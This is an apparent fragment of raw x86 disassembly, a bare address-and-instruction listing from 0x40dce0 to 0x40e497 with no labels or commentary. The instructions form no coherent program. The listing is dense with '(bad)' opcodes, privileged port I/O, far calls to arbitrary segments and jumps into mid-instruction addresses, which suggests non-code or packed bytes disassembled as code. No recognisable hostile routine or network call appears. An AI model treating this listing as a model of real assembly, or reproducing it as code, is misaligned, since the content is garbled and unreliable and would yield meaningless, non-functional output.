  40dce0:	mov    ch,0xf1
  40dce2:	es pop eax
  40dce4:	das    
  40dce5:	push   cs
  40dce6:	out    0x57,al
  40dce8:	scas   eax,DWORD PTR es:[edi]
  40dce9:	xchg   esp,eax
  40dcea:	nop
  40dceb:	inc    ebp
  40dcec:	ins    BYTE PTR es:[edi],dx
  40dced:	or     al,0x15
  40dcef:	cmp    DWORD PTR ds:0xeaf72a60,ebx
  40dcf5:	sti    
  40dcf6:	je     0x40dcc2
  40dcf8:	shr    BYTE PTR [ecx+0x7d],0xe6
  40dcfc:	out    0x3d,eax
  40dcfe:	ret    
  40dcff:	cmp    al,0x7e
  40dd01:	xchg   ebx,eax
  40dd02:	pop    ebx
  40dd03:	cmp    edi,eax
  40dd05:	shl    BYTE PTR [ebp-0x570a7987],0x34
  40dd0c:	xchg   BYTE PTR [esi-0xc19cc7f],ch
  40dd12:	inc    edx
  40dd13:	retf   
  40dd14:	mov    eax,ds:0x45a5c95c
  40dd19:	pop    ebp
  40dd1a:	pop    es
  40dd1b:	cmp    bh,BYTE PTR [eax+0x7d5bfdfb]
  40dd21:	arpl   sp,bx
  40dd23:	(bad)  
  40dd24:	pop    ss
  40dd25:	cmp    ebx,DWORD PTR [ecx]
  40dd27:	in     al,dx
  40dd28:	dec    esi
  40dd29:	add    al,bh
  40dd2b:	popa   
  40dd2c:	and    BYTE PTR [eax],bh
  40dd2e:	in     al,0xf3
  40dd30:	add    DWORD PTR [esi+0x46],esp
  40dd33:	aad    0x81
  40dd35:	repz adc DWORD PTR [edi+ebp*1+0x2279517c],edx
  40dd3d:	xchg   ebx,eax
  40dd3e:	push   0x48a0c5aa
  40dd43:	pop    esi
  40dd44:	in     eax,0x77
  40dd46:	fimul  DWORD PTR ds:0xdf3e056b
  40dd4c:	sub    ecx,DWORD PTR [eax+0x4850adea]
  40dd52:	sub    ebp,esi
  40dd54:	leave  
  40dd55:	cdq    
  40dd56:	inc    ebp
  40dd57:	add    BYTE PTR [esi],0xfa
  40dd5a:	push   0x19b42590
  40dd5f:	sub    DWORD PTR [ecx],esi
  40dd61:	ds inc esi
  40dd63:	inc    edx
  40dd64:	inc    edx
  40dd65:	fisub  DWORD PTR [ebp+edx*4-0x215dfc94]
  40dd6c:	pop    ebp
  40dd6d:	imul   ebx,edx,0x9351aaf5
  40dd73:	jae    0x40dd37
  40dd75:	sub    eax,0x409c9db4
  40dd7a:	shl    ch,1
  40dd7c:	call   0x8a14c7f4
  40dd81:	stos   BYTE PTR es:[edi],al
  40dd82:	jmp    0x60a47aa0
  40dd87:	sub    DWORD PTR [ebx],0x26
  40dd8a:	sub    dh,BYTE PTR [ecx]
  40dd8c:	pop    esp
  40dd8d:	mov    cl,0x9c
  40dd8f:	adc    BYTE PTR [esi+0x5bad7177],ch
  40dd95:	mov    ah,0x4c
  40dd97:	pop    ss
  40dd98:	mov    WORD PTR [edi],?
  40dd9a:	ins    DWORD PTR es:[edi],dx
  40dd9b:	(bad)  
  40dd9d:	scas   al,BYTE PTR es:[edi]
  40dd9e:	and    BYTE PTR [eax+0x10ac5074],0x5e
  40dda5:	inc    BYTE PTR [esi+0x2b]
  40dda8:	inc    ebp
  40dda9:	(bad)  
  40ddaa:	std    
  40ddab:	(bad)  
  40ddac:	xchg   ebx,eax
  40ddad:	psubb  mm3,QWORD PTR [eax+0x5]
  40ddb1:	pop    ebx
  40ddb2:	sti    
  40ddb3:	mov    edi,0x809b9e27
  40ddb8:	push   ds
  40ddb9:	mov    eax,0x22b4c87
  40ddbe:	aaa    
  40ddbf:	loope  0x40de12
  40ddc1:	inc    ebp
  40ddc2:	stos   BYTE PTR es:[edi],al
  40ddc3:	xor    dh,ch
  40ddc5:	mov    ds:0x41cedd1c,eax
  40ddca:	or     al,0xae
  40ddcc:	xchg   ebp,eax
  40ddcd:	jbe    0x40dde8
  40ddcf:	pop    edx
  40ddd0:	jno    0x40ddce
  40ddd2:	push   ebx
  40ddd3:	in     al,dx
  40ddd4:	adc    ch,BYTE PTR [esi]
  40ddd6:	xadd   DWORD PTR [eax+0x2a11102e],ebx
  40dddd:	(bad)  
  40ddde:	dec    esi
  40dddf:	adc    BYTE PTR [esi-0x1b2873d5],ah
  40dde5:	and    ebx,DWORD PTR ds:0x2f49031d
  40ddeb:	mov    bh,0xd
  40dded:	xchg   edx,eax
  40ddee:	cmp    BYTE PTR [edx+0x50b0ca76],0x80
  40ddf5:	xchg   ebx,eax
  40ddf6:	out    dx,al
  40ddf7:	xchg   ecx,eax
  40ddf8:	outs   dx,BYTE PTR ds:[esi]
  40ddf9:	das    
  40ddfa:	imul   esi,DWORD PTR [ecx-0x48271721],0x41
  40de01:	or     eax,0x35ab762f
  40de06:	lds    ebx,FWORD PTR [eax-0x2a926c80]
  40de0c:	mov    bl,0x3b
  40de0e:	jle    0x40de5e
  40de10:	mov    bh,0x41
  40de12:	jl     0x40dd9d
  40de14:	lods   al,BYTE PTR ds:[esi]
  40de15:	xor    edx,DWORD PTR [eax-0x65]
  40de18:	cmp    BYTE PTR [eax+ebx*4+0x3f],cl
  40de1c:	sub    eax,0xe2c694b6
  40de21:	sbb    ebx,DWORD PTR [esi+0x66c64fdd]
  40de27:	sbb    ebp,DWORD PTR [edi+0x44]
  40de2a:	iret   
  40de2b:	scas   al,BYTE PTR es:[edi]
  40de2c:	dec    ebp
  40de2d:	xchg   ecx,eax
  40de2e:	cmc    
  40de2f:	fs out dx,al
  40de31:	ret    0xfc5a
  40de34:	mov    ah,ch
  40de36:	fadd   DWORD PTR [edi+eiz*8-0x2274662c]
  40de3d:	out    dx,eax
  40de3e:	ror    DWORD PTR [ebx+esi*1+0xba84d8b],cl
  40de45:	loop   0x40dddf
  40de47:	ror    DWORD PTR ds:0x224f9f4a,cl
  40de4d:	sub    DWORD PTR [edx+0x50],0xa4c55b1f
  40de54:	xchg   esp,eax
  40de55:	adc    DWORD PTR [ebp+ecx*2+0x6],0x1
  40de5a:	pop    ebp
  40de5b:	ss repz sahf 
  40de5e:	dec    edi
  40de5f:	adc    BYTE PTR [ecx-0xd],dl
  40de62:	leave  
  40de63:	lds    esp,FWORD PTR [eax-0x39a32c03]
  40de69:	ds xor eax,0x8e33df70
  40de6f:	jp     0x40dec4
  40de71:	sbb    DWORD PTR [edi+0x38],edx
  40de74:	and    al,0x69
  40de76:	(bad)  
  40de77:	rcl    BYTE PTR [esi+0x4a],1
  40de7a:	xchg   ecx,eax
  40de7b:	xchg   ebx,eax
  40de7c:	shr    BYTE PTR [eax+0x260845b9],0xcc
  40de83:	out    0xc0,eax
  40de85:	fld    QWORD PTR [esi-0x7a]
  40de88:	pop    ss
  40de89:	sub    eax,0xee7497ca
  40de8e:	and    bh,ch
  40de90:	and    eax,0xf3722958
  40de95:	(bad)  
  40de96:	sub    ecx,DWORD PTR [esi]
  40de98:	mov    ah,0x74
  40de9a:	leave  
  40de9b:	xchg   ecx,eax
  40de9c:	ret    0xa59
  40de9f:	daa    
  40dea0:	mov    edx,0xfc11a48f
  40dea5:	push   cs
  40dea6:	int    0xee
  40dea8:	mov    BYTE PTR [edi-0x6],bh
  40deab:	mov    dl,0x23
  40dead:	xor    al,0xeb
  40deaf:	test   al,0x97
  40deb1:	je     0x40de4d
  40deb3:	or     edx,ebx
  40deb5:	pop    edx
  40deb6:	out    0x3e,al
  40deb8:	stos   DWORD PTR es:[edi],eax
  40deb9:	fmul   st,st(4)
  40debb:	inc    edx
  40debc:	scas   al,BYTE PTR es:[edi]
  40debd:	pop    ecx
  40debe:	dec    ebp
  40debf:	cli    
  40dec0:	stos   BYTE PTR es:[edi],al
  40dec1:	xchg   esi,eax
  40dec2:	pop    esi
  40dec3:	in     eax,dx
  40dec4:	push   ebp
  40dec5:	and    al,0xd7
  40dec7:	jns    0x40def1
  40dec9:	sti    
  40deca:	fild   WORD PTR [esi-0xf]
  40decd:	aaa    
  40dece:	sbb    al,0x47
  40ded0:	push   ebx
  40ded1:	fild   DWORD PTR [ebp+0x36bd096c]
  40ded7:	sbb    al,0xa5
  40ded9:	lds    esp,FWORD PTR [ebx]
  40dedb:	cmp    eax,0x64b1b44a
  40dee0:	stos   BYTE PTR es:[edi],al
  40dee1:	mov    WORD PTR [ecx-0x1587beb7],ds
  40dee7:	jmp    0x40de7a
  40dee9:	fldcw  WORD PTR gs:[ecx]
  40deec:	(bad)  
  40deed:	and    DWORD PTR [eax+edi*2],esp
  40def0:	jns    0x40df17
  40def2:	test   BYTE PTR [edi],0x3
  40def5:	sub    ebp,DWORD PTR [ecx+edi*8+0x45d2f720]
  40defc:	sub    ecx,DWORD PTR [esi-0x70]
  40deff:	aas    
  40df00:	mov    ds:0xf5c1b74,al
  40df05:	and    al,0xab
  40df07:	sbb    ebx,DWORD PTR [ebp-0x7b]
  40df0a:	rcl    BYTE PTR [esi+0x7c],cl
  40df0d:	cmp    eax,0xd0998b43
  40df12:	dec    eax
  40df13:	loop   0x40deb3
  40df15:	xchg   ebx,eax
  40df16:	cmp    cl,BYTE PTR [eax+0x46a2aa56]
  40df1c:	jbe    0x40dea1
  40df1e:	add    BYTE PTR [edi+0x5e44596c],ch
  40df24:	pushf  
  40df25:	sub    bl,BYTE PTR [edi+0x33b1065e]
  40df2b:	call   0x4715176a
  40df30:	inc    ebp
  40df31:	or     bl,BYTE PTR [edi]
  40df33:	xchg   esp,eax
  40df34:	jl     0x40dfa8
  40df36:	inc    esi
  40df37:	(bad)  
  40df38:	fs dec ecx
  40df3a:	cld    
  40df3b:	cmp    eax,0xc4a26756
  40df40:	or     al,0x5d
  40df42:	mov    DWORD PTR [ecx+0x2a],edx
  40df45:	lock xchg edi,eax
  40df47:	pop    ss
  40df48:	mov    WORD PTR [ecx],?
  40df4a:	push   edx
  40df4b:	pop    esi
  40df4c:	mov    bl,0x65
  40df4e:	sti    
  40df4f:	sbb    al,0x9a
  40df51:	out    dx,eax
  40df52:	and    al,0x2d
  40df54:	mov    ebp,0x4098fc54
  40df59:	popa   
  40df5a:	test   al,0xb2
  40df5c:	sti    
  40df5d:	das    
  40df5e:	test   ah,0xda
  40df61:	imul   esp,esi,0xda328abf
  40df67:	bound  edi,QWORD PTR [eax-0x50a7725]
  40df6d:	in     al,dx
  40df6e:	pop    ss
  40df6f:	dec    BYTE PTR [ebx-0x50ce404f]
  40df75:	ds sub ah,bl
  40df78:	add    DWORD PTR [edi+0x3d],0xfffffffb
  40df7c:	imul   ebp,DWORD PTR [edi+0x6b4abc43],0xffffff80
  40df83:	pop    eax
  40df84:	je     0x40dfba
  40df86:	repz mov ebp,0x6311a1f9
  40df8d:	pop    ss
  40df8e:	adc    eax,0x76de233b
  40df93:	leave  
  40df94:	jle    0x40dff6
  40df96:	sbb    DWORD PTR [eax],esi
  40df98:	(bad)  
  40df99:	xlat   BYTE PTR ds:[ebx]
  40df9a:	ss pop ds
  40df9c:	cmc    
  40df9d:	inc    ebp
  40df9e:	fcom   QWORD PTR [esi]
  40dfa0:	outs   dx,BYTE PTR ds:[esi]
  40dfa1:	cmp    eax,0xc9ca4e9a
  40dfa6:	arpl   WORD PTR [ebp+0x18],si
  40dfa9:	jns    0x40df66
  40dfab:	call   DWORD PTR [edi-0x17]
  40dfae:	push   edi
  40dfaf:	(bad)  
  40dfb1:	mov    ds:0x2be3cf7d,eax
  40dfb6:	push   ebp
  40dfb7:	fcomp  st(5)
  40dfb9:	mov    BYTE PTR [eax],0xa9
  40dfbc:	addr16 ja 0x40df76
  40dfbf:	xor    bl,BYTE PTR [ebx+0x207c1b6b]
  40dfc5:	std    
  40dfc6:	dec    ecx
  40dfc7:	cmp    eax,0x5161ceec
  40dfcc:	sbb    al,0xa4
  40dfce:	pop    es
  40dfcf:	je     0x40df79
  40dfd1:	jmp    0x8d6ff52d
  40dfd6:	adc    edi,ebx
  40dfd8:	nop
  40dfd9:	jle    0x40e005
  40dfdb:	dec    ebx
  40dfdc:	mov    eax,0x34b02841
  40dfe1:	fiadd  WORD PTR [eax-0x69f61e0b]
  40dfe7:	cli    
  40dfe8:	test   al,0x6d
  40dfea:	inc    edi
  40dfeb:	jb     0x40e03c
  40dfed:	adc    dh,BYTE PTR [esi+0x1d89b543]
  40dff3:	mov    ah,0x51
  40dff5:	add    BYTE PTR [esi+ebx*2-0x6f5dab1f],ch
  40dffc:	rcl    DWORD PTR [ebp+0x13],cl
  40dfff:	add    dh,BYTE PTR [eax]
  40e001:	repz (bad) 
  40e003:	in     al,0xa3
  40e005:	jp     0x40e036
  40e007:	call   0xc6165c05
  40e00c:	jg     0x40dff6
  40e00e:	push   esi
  40e00f:	ret    
  40e010:	add    al,0x63
  40e012:	sbb    al,0xbd
  40e014:	sbb    BYTE PTR [ebp-0x3b98f695],ch
  40e01a:	mov    ah,0x8
  40e01c:	jb     0x40e03d
  40e01e:	aad    0x59
  40e020:	mov    esi,0xaa2949fc
  40e025:	xor    al,0x86
  40e027:	dec    edx
  40e028:	cs call 0x2f13:0xaf33cf59
  40e030:	inc    ebx
  40e031:	xor    dh,bh
  40e033:	inc    ebp
  40e034:	bound  eax,QWORD PTR [edx-0x1]
  40e037:	ins    BYTE PTR es:[edi],dx
  40e038:	mov    edx,0xe6c1c970
  40e03d:	push   ss
  40e03e:	xor    DWORD PTR [ecx+0x16],0x1b
  40e042:	pop    es
  40e043:	popfw  
  40e045:	mov    edx,DWORD PTR [edx-0x6c97a34a]
  40e04b:	retf   
  40e04c:	test   al,0xa2
  40e04e:	adc    bl,BYTE PTR [eax]
  40e050:	pop    ebp
  40e051:	add    al,0x28
  40e053:	pop    ss
  40e054:	cmp    eax,0x8b9cafc9
  40e059:	lahf   
  40e05a:	or     BYTE PTR [eax+edi*2],bh
  40e05d:	push   0x880e0d8
  40e062:	adc    BYTE PTR [edx],dl
  40e064:	mov    dh,BYTE PTR [esi]
  40e066:	test   al,0xc7
  40e068:	test   al,0x9c
  40e06a:	into   
  40e06b:	pop    es
  40e06c:	push   ds
  40e06d:	ja     0x40e01e
  40e06f:	xchg   ecx,eax
  40e070:	push   cs
  40e071:	xor    DWORD PTR [edx],0x60
  40e074:	jl     0x40e004
  40e076:	mov    edx,0x753833e1
  40e07b:	in     al,dx
  40e07c:	inc    edi
  40e07d:	mov    eax,ds:0xc6485484
  40e082:	packuswb mm7,mm3
  40e085:	inc    ebx
  40e086:	fs mov bh,0xb9
  40e089:	add    al,0x57
  40e08b:	sbb    ch,BYTE PTR [esi-0x40d79b03]
  40e091:	sbb    DWORD PTR ds:0x36a33213,0xffffffb0
  40e098:	sahf   
  40e099:	pop    eax
  40e09a:	add    eax,0xfd19fee4
  40e09f:	and    BYTE PTR [eax+ecx*2-0x2737516b],ah
  40e0a6:	call   0x1012fc0f
  40e0ab:	in     eax,dx
  40e0ac:	fidivr WORD PTR [edi+0x64]
  40e0af:	push   esi
  40e0b0:	push   edi
  40e0b1:	inc    ecx
  40e0b2:	popa   
  40e0b3:	out    0x13,eax
  40e0b5:	cli    
  40e0b6:	test   al,0x1e
  40e0b8:	sbb    cl,cl
  40e0ba:	jne    0x40e0c8
  40e0bc:	push   ebx
  40e0bd:	test   BYTE PTR [ecx+0x4f],cl
  40e0c0:	imul   edi,DWORD PTR [ebp+eiz*2-0x55a64c2b],0x8
  40e0c8:	push   ecx
  40e0c9:	push   es
  40e0ca:	ja     0x40e116
  40e0cc:	fistp  DWORD PTR [ecx]
  40e0ce:	cwde   
  40e0cf:	ins    DWORD PTR es:[edi],dx
  40e0d0:	jg     0x40e125
  40e0d2:	xor    al,BYTE PTR [ebp+0xbf43c22]
  40e0d8:	mov    ch,0x7a
  40e0da:	inc    eax
  40e0db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0dc:	jmp    0x6d7a3fc1
  40e0e1:	cdq    
  40e0e2:	mov    ebp,0xbd40107c
  40e0e7:	sbb    DWORD PTR ds:0xed073729,ebx
  40e0ed:	and    DWORD PTR [esi+0x58],0x9486794d
  40e0f4:	add    edi,DWORD PTR [eax]
  40e0f6:	push   ebp
  40e0f7:	ins    BYTE PTR es:[edi],dx
  40e0f8:	cmp    DWORD PTR ds:[esi],eax
  40e0fb:	(bad)  
  40e0fc:	fadd   QWORD PTR [esi+0x4f82d76]
  40e102:	mov    eax,0x7c7718c2
  40e107:	mov    eax,?
  40e109:	call   0x98bb:0x8f0d62a7
  40e110:	push   esp
  40e111:	adc    edi,DWORD PTR [ebx-0x61]
  40e114:	or     eax,0x6351a80
  40e119:	pop    edx
  40e11a:	inc    edx
  40e11b:	push   edi
  40e11c:	sub    al,0x6b
  40e11e:	push   edx
  40e11f:	cld    
  40e120:	repnz xor eax,0x7a92dbf9
  40e126:	pusha  
  40e127:	mov    eax,ds:0x47e9cfb0
  40e12c:	dec    ecx
  40e12d:	cwde   
  40e12e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e12f:	mov    dh,0xb5
  40e131:	pushf  
  40e132:	sahf   
  40e133:	push   ss
  40e134:	repz push es
  40e136:	mov    eax,0xf41b9152
  40e13b:	shl    DWORD PTR [ebx-0x5b],0xa
  40e13f:	es and eax,0x6c6586b4
  40e145:	test   al,0x6c
  40e147:	sub    DWORD PTR [edx+ebp*1+0x56ae90e0],0xffffffea
  40e14f:	inc    ebx
  40e150:	lds    esi,FWORD PTR [eax-0x5a772cf4]
  40e156:	fimul  WORD PTR [ecx]
  40e158:	mov    ch,0x21
  40e15a:	pop    ds
  40e15b:	repz dec eax
  40e15d:	jmp    0xa64aec3a
  40e162:	arpl   dx,bx
  40e164:	dec    edi
  40e165:	push   eax
  40e166:	(bad)  
  40e167:	outs   dx,BYTE PTR ds:[esi]
  40e168:	aam    0x64
  40e16a:	fdiv   DWORD PTR [esi+edi*2]
  40e16d:	cli    
  40e16e:	sbb    BYTE PTR [esi],al
  40e170:	dec    ebx
  40e171:	and    DWORD PTR [edx-0x29],ebx
  40e174:	add    BYTE PTR [ebp-0x380cc579],0x7b
  40e17b:	out    0x5a,al
  40e17d:	add    esp,ebx
  40e17f:	or     al,0x69
  40e181:	leave  
  40e182:	bound  esi,QWORD PTR [esi-0x46]
  40e185:	jge    0x40e1b5
  40e187:	pushw  ss
  40e189:	in     al,0x2
  40e18b:	mov    dl,BYTE PTR [esi]
  40e18d:	int3   
  40e18e:	mov    bl,bh
  40e190:	repnz in eax,dx
  40e192:	loope  0x40e159
  40e194:	out    0x27,eax
  40e196:	pop    edx
  40e197:	mov    edi,0x3245c566
  40e19c:	imul   ebp,DWORD PTR ds:0xd39d1c0a,0x39f94098
  40e1a6:	xchg   edx,eax
  40e1a7:	out    dx,al
  40e1a8:	mov    eax,ds:0xa5d3066
  40e1ad:	mov    WORD PTR [ebx],gs
  40e1af:	sub    DWORD PTR [edi-0x21af797d],esi
  40e1b5:	adc    DWORD PTR [ecx+ecx*4+0x66],esp
  40e1b9:	rcl    esi,0x37
  40e1bc:	rol    dl,cl
  40e1be:	mov    esp,0xb80ddcd5
  40e1c3:	test   al,0x9f
  40e1c5:	sub    DWORD PTR [ebx-0x7cd9ee70],edi
  40e1cb:	cmp    al,0xce
  40e1cd:	inc    ebp
  40e1ce:	fs adc eax,0xe26acef5
  40e1d4:	inc    ebp
  40e1d5:	in     eax,dx
  40e1d6:	sub    dh,ah
  40e1d8:	sbb    eax,0xb9b3804b
  40e1dd:	pop    ebp
  40e1de:	mov    al,ds:0xcacb5533
  40e1e3:	xchg   DWORD PTR [ecx],edi
  40e1e5:	lods   al,BYTE PTR ds:[esi]
  40e1e6:	js     0x40e1a9
  40e1e8:	xchg   ebp,eax
  40e1e9:	call   0x72835243
  40e1ee:	inc    esp
  40e1ef:	xchg   esi,eax
  40e1f0:	fstp   DWORD PTR [esi]
  40e1f2:	ds dec esp
  40e1f4:	xchg   esi,eax
  40e1f5:	leave  
  40e1f6:	or     eax,0x7d4729d0
  40e1fb:	xchg   ecx,eax
  40e1fc:	lods   al,BYTE PTR ds:[esi]
  40e1fd:	inc    esp
  40e1fe:	mov    bl,0x0
  40e200:	mov    edx,0x9e813a8f
  40e205:	add    ch,BYTE PTR [ebx]
  40e207:	jo     0x40e259
  40e209:	rcr    DWORD PTR [ecx+eiz*2],0xeb
  40e20d:	(bad)  
  40e20e:	lods   eax,DWORD PTR ds:[esi]
  40e20f:	fisttp DWORD PTR [eax]
  40e211:	test   DWORD PTR [edx+edx*8+0x43],0xbf197dd8
  40e219:	leave  
  40e21a:	fisttp WORD PTR [edx+0x56fa541d]
  40e220:	in     al,0x1a
  40e222:	mov    WORD PTR [edi+0x3b87a1d6],cs
  40e228:	xchg   DWORD PTR [edx+0x9],edx
  40e22b:	jnp    0x40e204
  40e22d:	pop    ds
  40e22e:	aas    
  40e22f:	fwait
  40e230:	add    eax,0x4ef5a23d
  40e235:	add    al,0xac
  40e237:	bound  edi,QWORD PTR [edi+0x7d9bbdff]
  40e23d:	xchg   DWORD PTR [edx+esi*4+0x8],edx
  40e241:	mov    ecx,0x7dac8c23
  40e246:	adc    BYTE PTR cs:[eax-0x3ad6b28],0xb0
  40e24e:	je     0x40e2b3
  40e250:	enter  0x1d2e,0x44
  40e254:	pop    ebp
  40e255:	and    eax,DWORD PTR [ebx+0x1e]
  40e258:	pop    ebp
  40e259:	out    0x2d,eax
  40e25b:	cmp    BYTE PTR [edi],dl
  40e25d:	repnz cld 
  40e25f:	pop    ebx
  40e260:	outs   dx,BYTE PTR ds:[esi]
  40e261:	jae    0x40e26e
  40e263:	xor    eax,0x22c847bd
  40e268:	call   0xbbed486f
  40e26d:	popf   
  40e26e:	arpl   bp,si
  40e270:	add    BYTE PTR [ecx+0x55b88750],bh
  40e276:	mov    bl,0x0
  40e278:	shl    BYTE PTR [edx-0x67],1
  40e27b:	dec    edi
  40e27c:	psrad  mm4,QWORD PTR [esi+edx*8]
  40e280:	fmul   QWORD PTR [ebx-0x4a44b2e5]
  40e286:	jnp    0x40e218
  40e288:	xchg   esp,eax
  40e289:	inc    esp
  40e28a:	mov    WORD PTR [esi-0x29aaf9a8],es
  40e290:	pop    eax
  40e291:	call   0x3eb4a631
  40e296:	push   esi
  40e297:	js     0x40e2e3
  40e299:	adc    BYTE PTR [ecx+eax*2+0x2e4b0dd4],dl
  40e2a0:	rcr    DWORD PTR [eax+0x4693738c],0x15
  40e2a7:	arpl   ax,dx
  40e2a9:	pop    esp
  40e2aa:	jge    0x40e2d7
  40e2ac:	cmp    BYTE PTR [edx+0x14b962f3],dh
  40e2b2:	js     0x40e276
  40e2b4:	loope  0x40e27d
  40e2b6:	or     eax,0xf195c064
  40e2bb:	sub    ebp,eax
  40e2bd:	xchg   BYTE PTR [edi+edi*2+0x2525c771],dl
  40e2c4:	repnz pushf 
  40e2c6:	cmp    eax,0x639966ec
  40e2cb:	lds    eax,FWORD PTR [eax+0x49]
  40e2ce:	add    DWORD PTR [eax],edi
  40e2d0:	clc    
  40e2d1:	sub    ch,0x97
  40e2d4:	jg     0x40e2eb
  40e2d6:	fisttp QWORD PTR [ebp+0x25]
  40e2d9:	push   ss
  40e2da:	fbld   TBYTE PTR [ebx]
  40e2dc:	pusha  
  40e2dd:	sub    eax,0xe9c645c
  40e2e2:	lea    eax,[ebp-0xc6b871b]
  40e2e8:	push   es
  40e2e9:	mov    ah,0xcd
  40e2eb:	fisubr DWORD PTR ds:0x1911da57
  40e2f1:	aaa    
  40e2f2:	push   DWORD PTR [edx]
  40e2f4:	mov    eax,0x1a89d26f
  40e2f9:	jno    0x40e2a5
  40e2fb:	jle    0x40e343
  40e2fd:	aam    0x26
  40e2ff:	clc    
  40e300:	in     eax,dx
  40e301:	cwde   
  40e302:	les    esp,FWORD PTR [ecx+0x1d]
  40e305:	dec    edx
  40e306:	or     al,0xec
  40e308:	pop    ds
  40e309:	call   0x83a1:0xe831a4a1
  40e310:	fbld   TBYTE PTR [esi]
  40e312:	xlat   BYTE PTR ds:[ebx]
  40e313:	xor    DWORD PTR [edx-0x32],esi
  40e316:	cmp    ch,BYTE PTR [ebx]
  40e318:	idiv   DWORD PTR [edi+0x50bcd467]
  40e31e:	inc    ecx
  40e31f:	jl     0x40e311
  40e321:	ins    BYTE PTR es:[edi],dx
  40e322:	daa    
  40e323:	add    BYTE PTR [ebp+0x26dee914],bh
  40e329:	mov    dh,0x81
  40e32b:	jg     0x40e350
  40e32d:	pop    esp
  40e32e:	push   esp
  40e32f:	jbe    0x40e350
  40e331:	pushf  
  40e332:	and    eax,0xbf283f3c
  40e337:	and    edx,DWORD PTR [edi*2+0x415118bc]
  40e33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e33f:	fsubr  DWORD PTR [edi+esi*8]
  40e342:	imul   ebx,DWORD PTR [ecx],0x29
  40e345:	jmp    0x4268:0xda1dbc33
  40e34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e34d:	pop    ebp
  40e34e:	arpl   WORD PTR [ecx],bx
  40e350:	add    ebx,DWORD PTR [eax-0x544eae9]
  40e356:	fldcw  WORD PTR [ebx+esi*8-0x10]
  40e35a:	jno    0x40e3c6
  40e35c:	jne    0x40e37b
  40e35e:	fstp   DWORD PTR [ebx+edx*1+0x7bc938d1]
  40e365:	sub    DWORD PTR [edx+edx*2],ebp
  40e368:	jae    0x40e36a
  40e36a:	add    al,0xd5
  40e36c:	sub    BYTE PTR [ebp-0x2dffc847],bh
  40e372:	rol    DWORD PTR [esp+esi*8+0x456a93c3],0x18
  40e37a:	es mov ebp,0x153164b3
  40e380:	jno    0x40e3b8
  40e382:	fdiv   QWORD PTR [ebx-0x33]
  40e385:	popf   
  40e386:	call   0xf64d67b2
  40e38b:	push   ds
  40e38c:	mov    ecx,DWORD PTR [esi+0x10]
  40e38f:	(bad)  
  40e390:	shr    ebp,cl
  40e392:	mov    al,ds:0x4684c93
  40e397:	mov    edx,esi
  40e399:	rol    DWORD PTR [ecx],1
  40e39b:	jg     0x40e343
  40e39d:	adc    BYTE PTR [edi],dl
  40e39f:	pop    ebx
  40e3a0:	push   esi
  40e3a1:	jbe    0x40e409
  40e3a3:	arpl   di,si
  40e3a5:	cwde   
  40e3a6:	xor    eax,0x7b3ef2c0
  40e3ab:	jle    0x40e401
  40e3ad:	js     0x40e426
  40e3af:	add    BYTE PTR ss:[eax+0x6be385e8],ah
  40e3b6:	aaa    
  40e3b7:	ins    BYTE PTR es:[edi],dx
  40e3b8:	test   BYTE PTR [eax+0x3b9c3707],dl
  40e3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3bf:	push   eax
  40e3c0:	mov    DWORD PTR [edi+ebx*2-0xdd726f7],edi
  40e3c7:	push   ebp
  40e3c8:	add    esi,0x9070e464
  40e3ce:	into   
  40e3cf:	pop    ebp
  40e3d0:	int3   
  40e3d1:	cmp    BYTE PTR [esi+0x7d8f882d],ah
  40e3d7:	jne    0x40e39a
  40e3d9:	sbb    dh,BYTE PTR [ecx]
  40e3db:	lar    ebp,WORD PTR [eax]
  40e3de:	add    al,0x77
  40e3e0:	test   eax,0x2fb47b0f
  40e3e5:	xchg   edx,eax
  40e3e6:	aas    
  40e3e7:	mov    al,ds:0xece7ac72
  40e3ec:	dec    eax
  40e3ed:	in     eax,0x47
  40e3ef:	mov    esi,0x3b4c65fa
  40e3f4:	jns    0x40e379
  40e3f6:	int3   
  40e3f7:	jl     0x40e3f5
  40e3f9:	loopne 0x40e37e
  40e3fb:	mov    ecx,0x296c9d1a
  40e400:	ja     0x40e3b4
  40e402:	shr    BYTE PTR [edx],cl
  40e404:	int3   
  40e405:	and    eax,0x726d9c36
  40e40a:	mov    fs,WORD PTR [ecx]
  40e40c:	out    0x41,al
  40e40e:	adc    eax,0xd5458ea8
  40e413:	fs jmp 0x4547a0aa
  40e419:	cld    
  40e41a:	pop    es
  40e41b:	retf   
  40e41c:	loope  0x40e3f1
  40e41e:	sbb    bh,BYTE PTR [ebp-0x4e]
  40e421:	add    ah,BYTE PTR [esi-0x507c6dd1]
  40e427:	lds    ebx,FWORD PTR [ecx+ebp*8+0x35]
  40e42b:	mov    fs,WORD PTR [edx]
  40e42d:	es (bad) 
  40e42f:	inc    ebx
  40e430:	dec    esi
  40e431:	mov    ds:0x8167511a,eax
  40e436:	shl    DWORD PTR [esi-0x3b783be4],cl
  40e43c:	fs push esp
  40e43e:	or     DWORD PTR [eax],esi
  40e440:	xor    bh,BYTE PTR [eax+0x70312a1d]
  40e446:	cmp    al,0xa7
  40e448:	popf   
  40e449:	or     dh,BYTE PTR [edx]
  40e44b:	clc    
  40e44c:	sub    DWORD PTR [ebp+0x72021aeb],esp
  40e452:	shr    esp,0xf7
  40e455:	add    eax,0x68d432be
  40e45a:	mov    bh,0xda
  40e45c:	sti    
  40e45d:	push   esi
  40e45e:	mov    ah,0xa6
  40e460:	mov    ebx,es
  40e462:	jno    0x40e429
  40e464:	dec    esi
  40e465:	sub    eax,0xf41dcc05
  40e46a:	add    ebp,esp
  40e46c:	mov    dh,0x6f
  40e46e:	cmp    DWORD PTR [esi-0x4e262bdd],ecx
  40e474:	xor    eax,esi
  40e476:	(bad)  
  40e477:	add    bh,BYTE PTR [edi]
  40e479:	sahf   
  40e47a:	inc    ecx
  40e47b:	stos   DWORD PTR es:[edi],eax
  40e47c:	sbb    al,0x26
  40e47e:	push   esp
  40e47f:	xor    dh,0x3f
  40e482:	(bad)  
  40e484:	sbb    al,0x30
  40e486:	jb     0x40e4aa
  40e488:	test   al,0x86
  40e48a:	rcl    DWORD PTR [eax-0x37],cl
  40e48d:	arpl   ax,si
  40e48f:	shl    dl,1
  40e491:	(bad)  
  40e492:	or     BYTE PTR [esi+0x39],bl
  40e495:	in     eax,dx
  40e496:	pop    ds
  40e497:	xlat   BYTE PTR ds:[ebx]
